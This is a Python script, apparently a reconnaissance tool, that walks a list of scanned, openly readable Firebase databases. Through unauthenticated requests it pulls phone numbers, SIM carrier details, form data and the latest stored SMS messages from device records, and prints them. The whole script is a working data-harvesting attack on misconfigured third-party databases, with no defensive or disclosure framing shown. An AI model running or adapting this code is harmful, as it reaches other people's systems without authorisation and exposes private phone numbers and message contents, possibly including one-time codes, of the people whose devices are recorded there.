import requests
import json
import re
import sys

sys.stdout.reconfigure(encoding='utf-8')

with open('scanned_firebase.json', 'r', encoding='utf-8') as f:
    scanned = json.load(f)

open_dbs = [d for d in scanned if d['status'] == 'open']
print(f"Analyzing {len(open_dbs)} open databases...")

def clean_phone(p):
    if not p:
        return None
    p_str = re.sub(r'[^0-9]', '', str(p))
    if len(p_str) == 10 and p_str[0] in '6789':
        return p_str
    if len(p_str) > 10 and p_str.endswith(tuple(str(i) for i in range(10))):
        last10 = p_str[-10:]
        if last10[0] in '6789':
            return last10
    return None

def inspect_db(db):
    url = db['url']
    db_type = db['type']
    devices_info = []
    
    # Decide paths to inspect
    subpaths = []
    if db_type == 'root_hex_devices':
        subpaths = [f"/{dev}" for dev in db['sample_devices'][:3]]
    elif db_type == 'users_subpath':
        subpaths = [f"/users/{dev}" for dev in db['sample_devices'][:3]]
    elif db_type == 'all_user_subpath':
        subpaths = [f"/All_User/{dev}" for dev in db['sample_devices'][:3]]
    else:
        # Check custom keys
        for k in db['keys'][:3]:
            subpaths.append(f"/{k}")

    for sp in subpaths:
        try:
            # Fetch shallow first or full node if small
            r = requests.get(f"{url}{sp}.json?shallow=true", timeout=4)
            if r.status_code != 200:
                continue
            shallow_keys = r.json()
            if not isinstance(shallow_keys, dict):
                continue
            
            # Now fetch keys of interest
            # Check phone keys
            phone = None
            carrier = None
            sms_path = None
            sms_count = 0
            latest_sms = None

            # Look for direct phone keys
            for pk in ['phoneNumber', 'phone_number', 'mobile', 'number', 'phone', 'userPhone', 'user_phone']:
                if pk in shallow_keys:
                    p_val = requests.get(f"{url}{sp}/{pk}.json", timeout=3).json()
                    c_phone = clean_phone(p_val)
                    if c_phone:
                        phone = c_phone
                        break
            
            # Check simInfo
            if not phone and 'simInfo' in shallow_keys:
                sim_data = requests.get(f"{url}{sp}/simInfo.json", timeout=3).json()
                if isinstance(sim_data, dict):
                    for s_k in ['sim1', 'sim2', 'sim0']:
                        s_info = sim_data.get(s_k)
                        if isinstance(s_info, dict):
                            c_phone = clean_phone(s_info.get('number') or s_info.get('phoneNumber'))
                            if c_phone:
                                phone = c_phone
                            c_name = s_info.get('carrierName') or s_info.get('carrier') or s_info.get('displayName')
                            if c_name:
                                carrier = c_name
                            if phone:
                                break

            # Check form_data
            if not phone and 'form_data' in shallow_keys:
                fd = requests.get(f"{url}{sp}/form_data.json", timeout=3).json()
                if isinstance(fd, dict):
                    phone = clean_phone(fd.get('mobile') or fd.get('phone') or fd.get('phoneNumber'))

            # Check SMS node
            for sk in ['receivedSms', 'sms', 'messages', 'all_sms', 'user_sms']:
                if sk in shallow_keys:
                    sms_path = f"{sp}/{sk}"
                    # Check shallow count of SMS
                    sms_shallow = requests.get(f"{url}{sms_path}.json?shallow=true", timeout=3).json()
                    if isinstance(sms_shallow, dict):
                        sms_count = len(sms_shallow)
                        # Fetch latest SMS
                        last_key = list(sms_shallow.keys())[-1]
                        latest_sms = requests.get(f"{url}{sms_path}/{last_key}.json", timeout=3).json()
                    break

            if phone or sms_path:
                devices_info.append({
                    'node': sp,
                    'phone': phone,
                    'carrier': carrier,
                    'sms_path': sms_path,
                    'sms_count': sms_count,
                    'latest_sms': str(latest_sms)[:120] if latest_sms else None
                })
        except Exception as e:
            pass
    return url, db_type, devices_info

print("\nSampling 15 active databases for phone & SMS structure...")
for db in open_dbs[:15]:
    url, db_type, devs = inspect_db(db)
    print(f"\nDB: {url} ({db_type})")
    if devs:
        for d in devs:
            print(f"   Node: {d['node']} | Phone: {d['phone']} | Carrier: {d['carrier']} | SMS: {d['sms_path']} (count: {d['sms_count']})")
            if d['latest_sms']:
                print(f"      Latest SMS: {d['latest_sms']}")
    else:
        print("   No direct device phone/sms matched in shallow test")
